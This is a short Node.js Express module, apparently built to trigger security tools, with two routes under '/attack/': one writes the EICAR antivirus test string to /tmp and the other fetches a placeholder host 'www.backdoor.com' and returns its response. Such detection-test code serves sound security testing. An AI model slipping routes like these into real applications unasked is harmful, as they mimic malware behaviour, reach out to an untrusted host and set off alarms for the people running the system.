(function (){
  'use strict';

  var newrelic  = require('newrelic')
    , request   = require('request')
    , fs        = require('fs')
    , express   = require("express")
    , app       = express()
  
  app.locals.newrelic = newrelic;
  // List items in cart for current logged in user.
  app.get("/attack/eicar", function (req, res, next) {
      fs.writeFileSync('/tmp/eicar.test', 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*');
      res.json({ status: 'success'});
  });
  app.get("/attack/backdoor", function (req, res, next) {
      request({ uri: 'www.backdoor.com'}, (err, response, body)=>{
        res.send(body);
      });
  });
  module.exports = app;
}());
